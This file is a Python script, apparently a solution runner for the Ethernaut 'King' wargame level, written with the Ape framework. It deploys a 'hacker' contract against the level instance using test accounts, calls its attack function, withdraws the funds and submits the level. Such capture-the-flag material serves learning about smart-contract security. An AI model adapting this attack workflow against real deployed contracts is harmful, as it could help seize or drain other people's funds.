from ape import accounts, project
from ..utils.helper import get_level_instance, level_completed

ETHERNAUT = "0xD2e5e0102E55a5234379DD796b8c641cd5996Efd"
LEVEL = "0x725595BA16E76ED1F6cC1e1b65A88365cC494824"


def main():
    # setting up user
    user = accounts.test_accounts[0]

    # get level instance
    instance, ethernaut = get_level_instance(
        ETHERNAUT, LEVEL, user, value="0.001 ether"
    )

    # deploy hacker contract
    print("\n--- Deploying hacker contract ---\n")
    hacker = project.King.deploy(instance, sender=user, value="0.0011 ether")

    # exploit goes here
    print("\n--- Exploiting level instance ---\n")
    hacker.attack(sender=user)

    print(f"\n--- Balance of your hacker contract is: {hacker.balance} ---\n")

    if hacker.balance > 0:
        print("\n--- Withdrawing remaining funds in contract ---\n")
        hacker.withdraw(sender=user)

    # submiting level instance
    print("\n--- Submitting level instance ---\n")
    submit_tx = ethernaut.submitLevelInstance(instance, sender=user)

    # checking if level is completed
    level_completed(ethernaut, submit_tx, user.address, instance, LEVEL)

    print("\n--- 🥂!LEVEL COMPLETED!🥂 ---\n")


if __name__ == "__main__":
    main()
